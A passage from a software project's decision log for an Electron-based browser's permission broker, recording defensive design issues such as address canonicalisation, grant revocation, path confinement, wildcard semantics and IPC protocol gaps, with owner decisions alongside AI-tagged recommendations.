**Needed by:** whoever next touches `broker-02-address`, and before the grant prompt is built in
build step 4.

**PARTIALLY RESOLVED on `stream/a20-canonical-address` (2026-08-28).** `canonicalAddress(addr):
string | null` is exported from `address.ts`, built from the same `address-parse.ts` parsers
`classifyAddress` uses; the local validator (`isCanonicalLiteral`, then living in
`canonical-host.ts`) is deleted, and both of its call sites -- `connect.ts` and
`connect-patterns.ts`'s `hostMatches` -- now compare `canonicalAddress(x) === x` instead, which is
exactly what `isCanonicalLiteral(x)` used to mean. `checkConnect`'s behaviour is unchanged: still
verified by the full existing suite (587 tests across `address.test.ts`, `connect.test.ts`,
`connect-patterns.test.ts`) passing unmodified before a single new test was added, plus four
deliberately-introduced mutants (accept a non-canonical literal at either of `connect.ts`'s two
gates simultaneously; have `canonicalAddress` echo its input instead of normalising; corrupt
`formatIpv4`'s byte order so it silently names a different address) all caught.

**The reject-vs-normalise call, made:** `canonicalAddress` NORMALISES -- `canonicalAddress('2130706433') === '127.0.0.1'`, not
`null`. An echo-only validator would give the still-open call sites below nothing to work with.
`connect.ts` keeps today's stricter "declare it legibly or the connection is refused" behaviour on
top of that by comparing the result to the input, so this is additive, not a loosening.

**One surviving mutant, found and judged equivalent rather than fixed.** Weakening
`hostMatches`'s pattern-literal check from `canonicalAddress(host) !== host` to
`canonicalAddress(host) === null` passes the full suite unmodified. Proof it cannot be observed
through `checkConnect`: `address` reaching `hostMatches` is always already canonical (`connect.ts`
enforces `canonicalAddress(address) === address` before calling it on every path), and
`canonicalAddress` is idempotent on a canonical string, so `host === address` can only be true
when `host` is itself already canonical -- making the earlier check redundant for correctness
given that invariant, provably rather than just untested. Not fixed, because
`connect.test.ts`/`connect-patterns.test.ts`'s own header rules out unit-testing `hostMatches`
directly ("do not take it"), and the check itself is pre-existing (a faithful port of
`isCanonicalLiteral`'s equivalent shape, not something this stream introduced) and stays for
defence in depth and for `udp.send`, which the file's header notes may reuse it later without
`connect.ts`'s invariant necessarily holding.

**Still open -- the two call sites named above are unchanged by this PR, deliberately:** the grant
prompt does not exist before build step 4, and editing `policy/update.ts` from this stream would
be the same cross-stream edit this entry already flagged once. Whoever builds either should read
this entry first; `canonicalAddress` is ready for both.

**One of the two adopted, 2026-09-03, `stream/broker-18-update-hostcovers`.**
`policy/update.ts`'s `hostCovers` now compares two hosts via `canonicalAddress` whenever both
parse as address literals, so `2130706433:22` and `127.0.0.1:22` correctly read as the SAME
granted authority rather than a widening needing re-consent for nothing that actually changed.
Stated precisely, not overclaimed (A50's own lesson): this closes `update.ts`'s call site only.
**The grant prompt is still the one remaining un-adopted consumer** — it does not exist yet, so
there is nothing to fix there today; whoever builds it should read this entry and use
`canonicalAddress` the same way from the start, rather than rendering a manifest's raw, possibly
opaque spelling of an address to the user.

---

### A21 -- grant id stability across a revoke and a re-grant **[AI-REC]**

Found while fixing the revocation cascade in `src/broker/handles/handles.ts` (review pass, 2026-08-27).

The cascade used to be a one-shot sweep: `revoke()` closed the handles a grant had
authorised and then forgot the grant entirely. An acquisition that passed the policy check
*before* the revoke and produced its socket *after* it -- the ordinary connect path -- was then
registered under a grant the user had just withdrawn, and since the permissions UI fires exactly
one revoke, nothing ever swept again. The fix is a bounded per-origin set of revoked grant ids
that `acquire`, `acquireDerived` and `run` refuse against.

That fix has one dependency the repository does not yet decide. If the ledger later mints a
**stable** `GrantId` derived from (origin, capability, pattern set), a permanent tombstone would
mean a capability the user withdrew could never be granted again -- and the failure would look
like "the grant prompt worked and the app still cannot connect", which nobody would trace back
to the handle table. If it mints a **fresh** id per grant event, tombstones are harmless forever.

**Resolved in the table, not in the ledger:** `HandleTable.grantIssued(origin, grantId)` clears
the tombstone. It is correct under both readings, and it costs the grant ledger one call at the
point where it records a grant. **Whoever writes the ledger must make that call**, and should
record here which of the two id schemes was chosen.

**Owner decision needed on:** nothing, unless the `grantIssued` call site is unwelcome. The
question is recorded because the assumption is load-bearing and was previously implicit.
### A22 — path confinement's case-sensitivity assumes single-case-hex root names **[AI-REC]**

Found while checking whether `stream/broker-04-path-confine` (merged as `ae9a13d`) was safe to
accept while `stream/broker-01-origin` was still being reworked. It was, and the rework has
since merged (PR #1) **without changing how a root is named** — the two are structurally
independent: disjoint files, `broker-04` is not stacked on `broker-01`, and
`confinePath(root, requested, realpath)` takes `root` as a parameter, never derives it.

The assumption is worth carrying forward anyway, because **nothing names a root directory yet**
— no code in the repository computes one, so the first implementation is still ahead. The
comparison in `paths.ts` between a canonicalised path and the root is deliberately
**case-sensitive**, justified by a comment citing T13b: *"Cross-platform roots are sha256(origin)
hex, single-case, so nothing legitimate collides."* That holds only as long as the root
directory name stays lowercase hex. `sha256(...)` of anything is still lowercase hex, so folding
a data hash into the string being hashed is fine — but a root named some other way (a raw
base58 CIDv0, or base64, both mixed-case) would make `confinePath` reject legitimate paths as a
spurious `symlink-escape` on case-insensitive filesystems (macOS and Windows, both supported
run-from-source targets).

**Not a security hole either way** — the failure direction is fail-closed (an app breaks, the
sandbox does not leak) — but worth stating before the code exists rather than after a confusing
bug report.

**Already specified, and that is the point:** T13b says directory names ARE
`sha256(canonical_origin)`, and `ADR-0009` reconfirms that the bundle hash does not rename them.
So this is not an open decision so much as a **constraint that currently lives only in a source
comment**, where the person implementing the app loader will not necessarily meet it.

**Needed by:** build step 4 (the app loader), which writes the first root directory. Keep root
names single-case (hex, or lowercase the encoding) — or `paths.ts`'s case-sensitivity comment
and its case-sensitivity tests have to be revisited together.

---

### A23 — a derived origin does not say whether it may be persisted **[RESOLVED 2026-09-04]**

Found while reviewing `stream/broker-01-origin` (2026-08-27). T13c forbids ever writing a
grant for a loopback, `file:` or plain-`http` origin to disk — session-scoped only, re-prompt
each launch. But `originFromUrl` returns a plain string, and `http://127.0.0.1:8080` has the
same type and shape as `https://x.example`. The rule is therefore enforceable only by every
caller remembering to re-parse the string and check, which is the shape of rule that gets
followed four times and forgotten on the fifth.

**Owner decision, 2026-08-27: keep the plain string for now.** The alternatives — returning
`{ origin, persistable }`, or adding an `isPersistableOrigin()` helper — both change or extend
a **durable** interface before the code that persists grants exists, and `ADR-0002` makes that
interface the artefact the project is built to outlive. Deciding its shape against a real
consumer at build step 2 is better than guessing now. `originFromUrl`'s doc comment states the
gap explicitly so a caller meets it at the point of use.

**Needed by:** build step 2, specifically whoever writes the grant ledger's persist path.

**Resolved 2026-09-04 (PR #68).** `src/broker/policy/origin.ts` now exports
`isPersistableOrigin(origin)`, built against the real consumer this entry deferred for —
`GrantLedger`'s version-floor persistence (A57). It refuses `http:` outright, the whole
`.localhost` namespace (not just the bare name), and any host `classifyAddress` calls `loopback`
or `unspecified` (covering `0.0.0.0`/`[::]`, which route to loopback in practice on Linux and
macOS even though they're a distinct address class from `loopback` itself). `originFromUrl`
itself is unchanged, per the owner's original decision — the durable interface stayed a plain
string; persistability is a separate, composable check a caller opts into.

### A24 — should a whole-codebase guideline sweep be exempt from the one-stream-per-backlog-branch rule **[STILL OPEN]**

Found while opening the PR for `stream/backlog-07-guidelines-cleanup` (2026-08-28).
`parallel-work.md` §`backlog-NN` branches is explicit: a backlog branch borrows one stream's
paths, and "if the work would touch two streams' paths, it is two branches." That branch touches
six: `broker` (`src/broker/policy/` splits and dedups), `packaging` (`scripts/cli.mjs`,
`scripts/check-vectors.mjs`), `shell` (`src/main/channels.ts`, `update-check.ts` and its split
siblings), `telemetry` (comment cuts in `src/telemetry/`), `docs` (the guideline documents,
`devlog/`), and `shared` (`src/shared/README.md`, prose-only — no file was added under
`src/shared/`).

**Why this happened.** The plan for applying `code-guidelines.md`'s three rules across the
codebase split the work into two branches by **risk** (violations first, then near-limit
cleanup) — approved by the owner before this rule was re-checked against it. A guideline sweep
is inherently cross-cutting by nature: the whole point is touching every file that violates a
rule, wherever it lives. Splitting strictly by stream would have produced five or six branches
whose only relationship is "ran the same regex-shaped task over different directories" — real
git overhead (interleaved commits already exist and would need hunk-level splitting) for PRs
that would each read as "same mechanical change, different folder."

**Recommendation [AI-REC]:** treat a repository-wide guideline or lint-style sweep as a
carve-out from the one-stream rule, same spirit as the `type:chore` short form already carved
out of the PR blueprint's seven-section requirement — but say so explicitly in
`parallel-work.md` rather than leaving each future sweep to rediscover the tension. The ordinary
case the rule protects against (a task that happens to touch two unrelated streams) is different
in kind from a sweep that touches all of them on purpose.

**Why this is written down rather than just done.** The PR that surfaces this (labelled
`needs-owner-decision`) is a fait accompli either way — the code is written, tested and
verified, and re-splitting it now costs real time for uncertain benefit. What is genuinely open
is whether this is treated as a one-time, named exception or whether the rule itself should grow
a carve-out for the next sweep.

### A27 — `*.` means two different things depending which file reads it **[RESOLVED 2026-09-03]**

Pre-existing on `main`. Found from three independent angles during the broker/loader review
pass (2026-09-01) — an altitude read of `update.ts` against `connect-patterns.ts`, and a
cross-file check run twice more from different starting points — all converging on the same
file pair.

`src/broker/policy/update.ts`'s `hostCovers` treats a leading `*.` as a **real** suffix
wildcard for the app-update re-consent check — `*.example.com` genuinely matches
`api.example.com`, with a documented registry-boundary argument for why that is safe there.
`src/broker/policy/connect-patterns.ts` treats the identical syntax as matching **nothing**, and
says so directly in its own comment: *"No sub-glob support: `*.example.com` matches nothing
rather than being approximated."*

**Concrete failing scenario.** A developer writes a manifest with
`connect: ["*.api.example.com:443"]`, modelling it on the wildcard syntax `update.ts` treats as
real. `parseManifest` accepts it, the grant prompt renders it, and the user approves it — and the
capability then authorises nothing, because `connect-patterns.ts` denies every host that pattern
could name. Verified directly: `parseManifest('*.example.com:443')` succeeds, and
`connect-patterns.ts` has no host that pattern allows.

The failure direction is safe — an app that trips this is over-refused, never under-refused —
so this is a trap rather than a hole, the same distinction `canonical-host.ts` already draws for
its own wildcard case.

**AI recommendation:** decide what `*.` means, once, and make both files agree. The safer
reading is "no sub-globs" — the one `connect-patterns.ts` already argues for — in which case
`hostCovers`'s wildcard branch is the one that should narrow, to exact match plus a bare `*`.

**Needed by:** before the grant prompt is built (build step 4), the first point a user sees a
pattern that means two different things depending which file is asked.

**Resolved 2026-09-03, `stream/broker-18-update-hostcovers`.** Took the AI recommendation above
as written: `hostCovers`'s `*.` suffix-wildcard branch is deleted outright. A granted
`*.example.com` now falls through to the exact-string check, matching `connect-patterns.ts`'s own
"authorises nothing" reading — so the concrete failing scenario above can no longer occur: an app
moving from an inert `*.example.com` grant to a real `api.example.com` pattern is now correctly
seen as a WIDENING (the granted pattern authorised nothing; any real host is wider than that) and
prompts for re-consent, rather than sliding through silently. An update whose wildcard pattern is
completely unchanged between versions still reads as covered, via the same exact-string check —
the fix does not force needless prompts, only closes the one that was missing.
`src/broker/policy/tests/update.test.ts`'s "a subdomain wildcard does cover a subdomain" case was
inverted (now expects `capability-prompt`, with a comment citing this entry) and a new case pins
the unchanged-pattern behaviour.

### A28 — path confinement's synchronous `realpath` blocks the broker on every confined `fs` call **[AI-REC]**

Pre-existing on `main` (`src/broker/policy/paths.ts`'s `realpath` parameter is declared
synchronous). Found during a review pass over the broker's efficiency, corroborated
independently by an altitude pass and a line-scan pass over the same file.

`confinePath`'s algorithm can walk several blocking `stat`/`lstat` syscalls per call, and its
`realpath` parameter is declared **synchronous**. Any broker that uses it therefore performs
blocking syscalls on the main thread inside functions (`readFile`/`writeFile`) that are
otherwise async.

**Concrete failing scenario.** One origin whose confinement root sits on a slow or
network-backed filesystem hard-blocks — not merely queues — every other origin's pending `net`
and `fs` calls. That is `security-model.md`'s named threat T11b (*"a loop of
`orivon.fs.stat()` hangs the whole browser"*), reached by a mechanism the in-flight cap cannot
bound: the cap limits the *number* of concurrent operations, not the cost of any one of them.

**AI recommendation:** give `confinePath` an async `realpath` parameter
(`(p: string) => Promise<string>`) and make `confinePath` itself async, so callers can `await
fs.promises.realpath`. Not a fix to make in passing — `policy/paths.ts` sits outside the paths
this defect was found from, and reaching into it from an unrelated stream is exactly the kind of
cross-stream edit `parallel-work.md` asks to be raised rather than made.

**Needed by, re-dated 2026-09-01 (owner's decision, filed alongside A35):** the original trigger
— "before `orivon.fs` is wired to a renderer" — turns out to have been a proxy for the real one,
and it fired one step early. `confinePath` has exactly one caller in the whole tree
(`confineForOrigin`, `src/broker/index.ts:303`), and that call sits **behind** a grant check
(`:300`: `if (grant === undefined) throw fail('denied', ...)`). Nothing anywhere calls
`broker.grant()` yet, so every `orivon.fs` call today is refused before `confinePath` ever runs
— the blocking `realpath` this entry describes is real but currently **unreachable**.
`orivon.fs.readFile`/`writeFile` were wired to a renderer in `src/broker/transport/ipc.ts` (build step 2's
IPC task) on this date regardless, a decision the owner made explicitly rather than blocking on
this fix, since it changes nothing reachable yet. The AI recommendation above is unchanged —
this only corrects when it actually starts to matter: **before any origin holds a real `fs`
grant**, i.e. before the permission-prompt work lands.

### A29 — `quotaBytes`'s startup-reconciliation promise has no owner **[RESOLVED 2026-09-03]**

Pre-existing on `main` (`src/contracts/manifest.ts:102-111`). Found during a broker review
pass's check for behaviour the contract promises but nothing implements, corroborated twice.

`src/contracts/manifest.ts:102-111` documents the quota contract as maintaining *"a running
per-origin byte counter, checks it on write, and yields `'limit'` when exceeded, reconciling
against the directory on startup rather than walking the tree on every operation."* The
in-memory counter and on-write check exist, closing the unbounded-write hole this contract is
written to prevent. **The startup-reconciliation half does not:** it needs a persisted counter
and a way to size the confinement directory, and nothing currently owns either.

**Concrete failing scenario.** An app writes up to its quota, the user quits, and reopens the
app. Because the counter is in-memory only, it resets to zero on restart — the quota bounds a
session, not the disk, and the app can keep writing past its declared limit simply by
restarting.

**AI recommendation:** decide whether the counter is persisted by the broker (a new `BrokerFs`
member plus a startup hook) or by the storage layer build step 4 introduces, and record the
choice. `src/contracts/` itself should not change to soften the promise — the gap is in the
implementation, not the contract.

**Resolved 2026-09-03, owner decision, in two parts.**

**1. The counter must survive a restart.** The gap this entry describes gets closed rather than
documented away — `src/contracts/manifest.ts`'s promise stands and the implementation catches up.
The failing scenario is unchanged and now explicitly accepted as a real defect: an app writes to
its quota, the user quits and reopens, the in-memory counter resets to zero, and the app keeps
writing. The quota bounds a session, not the disk.

**2. Hitting the quota prompts the user for more space**, rather than failing silently or only
posting a notice. Three options were weighed on what a person actually experiences:

| | What the user sees | Why not |
|---|---|---|
| Silent refusal | An app that quietly stops being able to save, with whatever message the app chooses and no indication a limit was involved | Rejected: indistinguishable from the app being broken, and there is nothing the user can do about it |
| A passive notice | "This app has filled its storage", with a settings screen to raise the limit | Rejected for v0: needs a settings surface that does not exist, and quiet notices are ignored |
| **A prompt** | "*App* has used all the space it asked for. Give it more?" | **Chosen.** The user stays in control, learns which apps are storage-hungry, and can say no |

**The consequence that makes part 1 non-optional:** the prompt states a number. If the counter
resets on restart, that number is wrong — the box would tell a user an app has used 40 MB when
it has actually written 400 MB across eight sessions. Part 2 is what turns a hidden accounting
gap into a visible lie, which is why they were decided together and not separately.

**Still open, deliberately:** where the persisted counter lives (a `BrokerFs` member with a
startup hook, versus the storage layer build step 4 introduces) is an implementation choice, not
an owner one. Whoever builds it should record which, here. Rate-limiting a badly-written app that
triggers the prompt repeatedly is also unspecified; the shared per-origin token bucket (`A38`)
already bounds call frequency, but "do not re-ask for N minutes after a decline" is separate and
not designed.

**Needed by:** before packaging (build step 10), which is when a real user's disk is at stake.
The prompt half follows `A36`'s split — the ledger-side decision seam in build step 2, the box a
person reads in build step 4.

### A30 — `CLAUDE.md`'s `BaseWindow` titleBar claim is false against electron 44 **[AI-REC]**

Pre-existing on `main`. Found while reviewing a PR that was about to copy the same claim into
the `orivon-electron` project skill; verified independently against
`node_modules/electron/electron.d.ts` at electron 44.0.0 and against context7's live docs.

`CLAUDE.md` §Start here says Electron's `.d.ts` *"sometimes types an option/event on
`BrowserWindow` only, even when it works identically on `BaseWindow`"*, and names four
examples: `ready-to-show` and the `titleBarStyle`/`titleBarOverlay`/`trafficLightPosition`
family. **Only the first is true.** `ready-to-show` is genuinely declared on `BrowserWindow`
alone (`electron.d.ts:4704-4708`). The other three are declared directly on
`BaseWindowConstructorOptions` (`titleBarOverlay` at `:4039`, `titleBarStyle` at `:4043`,
`trafficLightPosition` at `:4049`), and `setTitleBarOverlay(...)` is a method on the
`BaseWindow` class itself (`:3569`).

**Concrete failing scenario.** `CLAUDE.md` is the first file every agent working here reads. An
agent that trusts this sentence will distrust the `.d.ts` for the titleBar family in a case
where the `.d.ts` is right — either chasing external verification it does not need, or avoiding
options that already work on `BaseWindow`, on the strength of a claim this repository made about
its own dependency.

**AI recommendation:** correct the sentence to keep only the `ready-to-show` example of the
`.d.ts` gap, and either drop the titleBar family from it or state separately that those three
are confirmed present on `BaseWindow`. The primary fix route is `/revise-claude-md`, which
`CLAUDE.md`'s own tooling table already assigns this job to — this entry is the durable record
in case that pass does not run before the claim is copied somewhere else.

**Needed by:** the next document or skill that would otherwise repeat the claim.

### A31 — extending the docs-borrow carve-out beyond `backlog-NN` branches **[AI-REC]**

A process question, extending A24's theme. Raised while reviewing a stream branch that changed
a function signature already documented in two `docs`-owned files.

`parallel-work.md`'s ownership map gives `docs/` to the `docs` stream, and its borrow mechanism
— letting a branch touch a path it does not own when leaving it stale would be worse — is
written for `backlog-NN` branches only. A stream branch changing `checkConnect`'s signature
needed to edit `docs/development/testing.md` and `docs/planning/build-plan.md`, because both
document that exact signature and both already carried two prior "Corrected" notes for the same
line. Leaving them stale after a third change would have been the worse outcome the borrow
mechanism exists to avoid.

**AI recommendation:** extend the borrow carve-out from `backlog-NN` branches to any branch
editing a document that specifies an interface the branch itself owns and is changing, on the
same terms — name it in the PR body. Same shape as A24's proposed carve-out for repo-wide
sweeps, and this is the second time the ownership map has needed one.

**Needed by:** before the next signature change lands. Not blocking anything today.

### A14 addendum — an argument against the trailing-dot merge, recorded after the decision

A14 (resolved by the owner 2026-08-26) strips the trailing DNS root label, so `https://x.example.`
and `https://x.example` are one origin. **The decision stands, re-confirmed by the owner on
2026-08-27.** This records an argument that surfaced during review afterwards, so that a future
reader does not mistake it for something nobody considered.

The reasoning behind A14 was that both spellings are the same DNS name, served by the same
operator under the same certificate. The first half is always true; **the second is not
guaranteed.** Browsers send `Host: x.example.` verbatim, and virtual-host matching is an exact
string comparison — nginx's `server_name x.example;` does not match it. On a host configured
that way the request falls through to the **default vhost**, which may serve different content
under a different operator's control. Merged origins mean that content inherits the app's
grants, storage domain and identity key.

**Why the decision was kept anyway:** exploiting it also requires a certificate valid for the
trailing-dot name, browsers generally strip the dot before certificate matching, and the
alternative costs a real user-visible failure — one mistyped character silently produces a
second, empty copy of the app that has to be re-granted everything. `ADR-0003` makes this
unfixable after the first grant is persisted, so it is recorded here rather than left implicit.

---

### A32 — should the new inert toolbar icons ship before they do anything **[AI-REC]**

Found while planning the chrome restyle (2026-08-28). The owner asked for a full visual match
to a reference screenshot, including icons for features that don't exist yet in this repository
and, in one case (a wallet-shaped glyph), a feature that is a stated MVP non-goal
(`mvp-scope.md` §Explicit non-goals — "Not a wallet"). The glyph is relabelled `identity` rather
than `wallet` in code and in its tooltip, since Nostr identity *is* in scope and the shape is
generic; nothing about the icon itself implies funds.

**Recommendation [AI-REC]:** every inert icon ships `disabled`, with a `title` naming what it
is and stating plainly that it is not in v0 (`"Extensions — not in v0"`), rather than either
omitting it (breaking the visual match the owner asked for) or drawing it silently clickable
(which answers a click with nothing, which is worse than an honest disabled state). Revisit
at this build step's readability check — if a newcomer reads the toolbar as promising features
that don't exist, that is exactly the class of finding that check is for.

**Needed by:** before the chrome-restyle PR opens.

---

### A33 — should the bookmarks bar hide itself when empty **[RESOLVED 2026-09-03]**

Found while planning the chrome restyle (2026-08-28). Chrome only shows its bookmarks bar on
the new-tab page by default; everywhere else, and for a user with zero bookmarks, it stays
hidden. This shell's v0 always shows the row, which is simpler to implement and reason about
but spends 28px of vertical space on an empty row for a fresh profile's very first launch.

**Resolved 2026-09-03, owner decision: hide it until there is at least one bookmark.** The row
appears the first time a site is saved and disappears again if the last one is removed.

The trade the owner accepted: hiding costs one content shift, since the page below moves down
by 28px when the row appears. That was preferred over always-on because the shift happens at
the exact moment the user saved a bookmark — an action they took deliberately, so the movement
reads as a response to what they just did rather than as the window rearranging itself. An
always-visible empty row, by contrast, costs a fresh profile 28px permanently and reads as
unfinished on the very first launch, which is the one launch that decides whether someone keeps
the browser.

Chrome's third option — show it only on the new-tab page — was considered and not taken: it
costs the same shift, needs more logic, and leans on a proper new-tab page this shell does not
have yet.

**Known and accepted:** someone who never saves a bookmark never learns the feature exists.
Discoverability of bookmarking rests on the star control in the toolbar, not on the empty row.

**Needed by:** whoever next touches `src/renderer/bookmarks-view.ts`. Not blocking anything.

---

### A34 — the tab strip's native-controls inset is an unmeasured approximation **[RESEARCH]**

Found while implementing the chrome restyle (2026-08-28). Merging the tab strip into the
window's title row means the tab strip must leave room for Electron's native window buttons
(`titleBarOverlay` on Windows/Linux; the macOS traffic lights). The documented way to learn
their exact geometry is `env(titlebar-area-x/y/width/height)` in CSS, or
`navigator.windowControlsOverlay.getTitlebarAreaRect()` in JS — but **every example in
Electron's own docs and test fixtures constructs a `BrowserWindow`**, and this shell is a
`BaseWindow` holding `WebContentsView`s, which has no single "main" webContents for the
Window Controls Overlay feature to attach to.

A throwaway probe app (`BaseWindow` + `titleBarOverlay` + a `WebContentsView` reading both
APIs from inside the page) confirmed empirically, rather than assumed: `env(titlebar-area-*)`
resolves to `0px` for every axis, and `navigator.windowControlsOverlay.visible` is `false` with
an all-zero rect. Neither API is populated for this window shape, on this Electron version
(44.0.0).

**Consequence:** the restyle reserves a fixed inset instead of a measured one — 138px on the
right for Windows/Linux (three native caption buttons at Windows 11's own 46px width, the same
figure the prior prototype hardcoded for its own custom buttons) and 78px on the left for
macOS (the `trafficLightPosition` offset plus the traffic-light cluster's width). If the real
native control area is ever narrower or wider than these numbers on some platform or desktop
environment, the result is a cosmetic gap or a very slightly crowded tab, not a functional
break — no interactive element ends up under a native button, because 138px and 78px are
deliberately generous.

**Needed by:** revisit if a future Electron version wires Window Controls Overlay geometry
through `BaseWindow`, or once real hardware on all three platforms has actually confirmed the
approximation holds. Nobody has verified this outside Linux/X11, where the probe above ran.

### A35 — `ResponseEnvelope` has no `handleId`, though `OrivonError` declares one **[AI-REC]**

Found while wiring `src/broker/transport/ipc.ts`'s control channel (build step 2's IPC task, 2026-09-01).

`contracts/errors.ts`'s `OrivonError` declares an optional `handleId`, and `src/broker/
handle-store.ts` populates it — a `'closed'` error is meant to be able to say *which* handle
closed. `contracts/ipc.ts`'s `ResponseEnvelope`'s failure branch carries `code`, `platformCode`
and `message`, but not `handleId`. Any control method that throws `'closed'` loses that field
the instant it crosses `ipcMain.handle`/`ipcRenderer.invoke`, silently — nothing here rejects a
response for omitting a field its own type never declared.

Not reachable today: none of the four control methods `ipc.ts` wires (`app.manifest`,
`app.grants`, `fs.readFile`, `fs.writeFile`) can throw `'closed'`. It becomes reachable the
moment a wired method can reference a live handle — the byte-pump task's `net.connect`/
`net.close`, most obviously.

**AI recommendation:** add `handleId?: string` to `ResponseEnvelope`'s failure branch, mirroring
`OrivonError` exactly. A `contracts/` change — its own PR, merges first, per `CLAUDE.md`
§Parallel work and this file's own convention for contracts gaps.

**Needed by:** before any control method that can throw `'closed'` is wired — likely the
byte-pump task.

### A36 — `build-plan.md` schedules grant prompts a build step earlier than `A20`/`A27` do **[RESOLVED 2026-09-03]**

Found while wiring `src/broker/transport/ipc.ts`'s control channel (build step 2's IPC task, 2026-09-01),
while checking whether this PR was expected to include a grant-prompt driver.

`build-plan.md`'s own `## Sequence` section lists *"grant prompts"* as part of step 2, alongside
manifest parsing, the grant model, per-origin enforcement and session partitions. But `A20`'s
and `A27`'s "Needed by" columns both say, independently and using the same words, *"before the
grant prompt is built (build step 4)"* — and both reasons are substantive: `A27` is about a
pattern-matching disagreement a user would see spelled two ways at the prompt, and `A20` is
about a canonicalisation helper the prompt has not adopted yet. Neither entry could have been
written against a step-2 prompt, since step 4 (the app loader) is what produces the manifest a
prompt has anything to show.

**This is not resolved by ignoring `build-plan.md`'s wording**, since the wording is itself an
open contradiction, not obviously a typo — `build-plan.md`'s step-2 sequence text may predate
`A20`/`A27`, or the step-4 dependency may itself be a later-discovered constraint that should
have moved the line in `build-plan.md` and did not.

**Not resolved in this PR.** `src/broker/transport/ipc.ts` wires no grant-prompt driver and no
`app.requestGrant` method — deliberately, per its own file header and this PR's "Deliberately
not done".

**Resolved 2026-09-03, owner decision: split the work; neither document is wrong, both are
incomplete.** "Grant prompts" was being used for two different things, which is why two honest
readings disagreed.

| Half | Build step | What it is |
|---|---|---|
| The grant ledger, and a headless grant-decision interface | **2** | The machinery that records a grant and the seam a decision arrives through. Tests drive it directly, auto-approving, so the broker's **allow** path is exercised end to end |
| The user-facing prompt | **4** | The dialog a person reads, built once a real manifest exists to render in it and `A20`/`A27` are settled |

**Why this shape rather than picking one document.** Today nothing in the tree calls
`broker.grant()`, so the broker can refuse perfectly and cannot be made to permit anything —
which is why `A28`'s blocking `realpath` is currently unreachable. That means the first time
anyone ever clicks Allow would also be the first time that path had ever run. For a user, the
failure that produces is worse than a refusal: an app that asked for permission, was given it,
and still does not work looks broken rather than deliberate. Putting the ledger in step 2 buys
the allow path weeks of exercise before a human is involved.

Deferring the **dialog** to step 4 is the other half of the same argument: `A20` (an address
rendered as `2130706433:22` instead of `127.0.0.1:22`) and `A27` (a pattern that reads as
"anything under this site" and authorises nothing) are both about a person being shown something
misleading at exactly the moment they are asked to trust it. Neither is settled, and a permission
prompt is the last surface in the product that should ship on a guess.

**Action outstanding:** correct `build-plan.md`'s step-2 Sequence entry to say *grant ledger*
rather than *grant prompts*, and add the prompt itself to step 4. `A20`'s and `A27`'s "Needed
by" columns are already correct as written and need no change.

**Needed by:** done — this was the blocker on scheduling either half.

### A37 — the byte pump's write direction has no wire protocol anywhere **[RESOLVED 2026-09-06]**

Found while implementing the byte pump's broker side (build step 2, 2026-09-01) — specifically
while designing `src/broker/transport/port-pump.ts`, which relays the READ direction only.

`contracts/ipc.ts` specifies exactly three messages for a socket's dedicated
`MessageChannelMain` port: `DataMessage` (broker -> renderer, bytes arriving), `CreditMessage`
(renderer -> broker, bytes consumed) and `StreamEndMessage` (broker -> renderer, once, at a
terminal state). All three exist to make the READ side's credit window work, and
`handle-contracts.md`'s "Backpressure — a credit window" section — the one place this whole
mechanism is specified in detail — describes the read side exhaustively and the write side in
exactly one sentence, an outcome rather than a protocol: *"`writable`'s `write()` resolves only
once the broker has accepted the bytes into the OS socket send buffer, so an app that `await`s
each write receives genuine write-side backpressure too."* Checked, not assumed:
`capability-api.md`'s Throughput section and `ADR-0008` were both re-read looking for a
write-side message shape; neither adds one beyond restating that same sentence.

**Concretely missing:** how the renderer sends outbound bytes to the broker over the port (does
it reuse `DataMessage`'s shape in the opposite direction, since the type carries no direction
field? a distinct `WriteMessage`?), and how the broker signals "accepted into the OS socket send
buffer" back to the renderer so its `writable.write()` promise resolves at the right moment (no
message type exists for this at all — not even an outcome-only one like `StreamEndMessage`).

**Not resolved in this PR**, on purpose, after discussion with the owner: `src/broker/port-
pump.ts` implements the read direction only and says so in its own header, rather than
inventing a write protocol from inside a `broker`-owned PR. Any wire message this needs is a
`src/contracts/` change, which `parallel-work.md` and this file's own convention both require to
merge first, alone, in its own PR — not decided implicitly by whichever stream happens to write
the preload-side pump.

**AI recommendation, for whoever writes that contracts PR:** the simplest consistent extension
is a `WriteMessage { kind: 'write', handleId, chunk }` (renderer -> broker, mirroring
`DataMessage`'s shape exactly) plus a `WriteAckMessage { kind: 'write-ack', handleId, bytesWritten
}` (broker -> renderer, sent once the OS socket's write callback fires) that the renderer's
`WritableStream`'s `write()` implementation awaits before resolving. Not implemented or vetted
against real backpressure behaviour — a recommendation to start from, not a decision.

**Needed by:** before the preload-side byte-pump PR (readable/writable WHATWG streams built over
the port in the isolated world) can implement `writable` at all.

### Resolution, 2026-09-06

`src/contracts/ipc.ts` (PR #79) now specifies the full write-side wire protocol this entry asked for:
`WriteMessage` (renderer -> broker), `WriteAckMessage`/`WriteFailedMessage` (broker ->
renderer), and the half-close/abort pair `WriteEndMessage`/`WriteAbortMessage` that the AI
recommendation above did not anticipate needing. `LIMITS.writeWindowBytes`
(`src/contracts/limits.ts`, 256 KiB) is the write-side credit window the AI recommendation's
sketch omitted; `WRITE_HEARTBEAT_MS`/`WRITE_SILENCE_TIMEOUT_MS` are the timing pair that tells
a slow peer apart from a dead transport. `handle-contracts.md`'s new "Backpressure — write
direction" section specifies all of this at the wire level, matching how the read side was
already documented, and its `§Limits` table now carries the write window alongside the read
one.

This closes what A37 actually asked for — a defined protocol, not a shipped implementation.
The broker-side write sink (PR #80) and the renderer's `writable` built over this contract
(PR #81) are separate, sibling changes built against the types PR #79 adds; their correctness
is tracked wherever those changes land, not here. If either implementation needs a message
shape this entry does not describe, that is new work, not this entry reopening.

### A38 — no per-origin rate limit on IPC dispatch, only a concurrency cap **[RESOLVED]**

Found re-checking the control channel while fixing an unrelated defect in the byte-pump PRs
(build step 2, 2026-09-02) — specifically while confirming what actually bounds
`app.manifest`/`app.grants`, the two wired methods with no I/O of their own.

`security-model.md`'s T11b entry names the mitigation as two things together: "Per-origin
in-flight cap + token-bucket rate limit on IPC dispatch; all `fs` work genuinely async." The
first half is real and tested — `HandleTable`'s `inFlight` counter (`handles.ts`), enforced via
`handleTable.run`, rejects immediately rather than queueing once `LIMITS.inFlightOperations` is
hit (`contracts/limits.ts`). The second half — a rate limit, bounding how often an origin may
call in a given span of time, independent of how many calls are outstanding at once — does not
exist anywhere in the tree. `grep`ping for "token", "bucket" or "rate.?limit" under `src/`
returns nothing resembling one.

This matters specifically for `app.manifest` and `app.grants`: neither calls `handleTable.run`
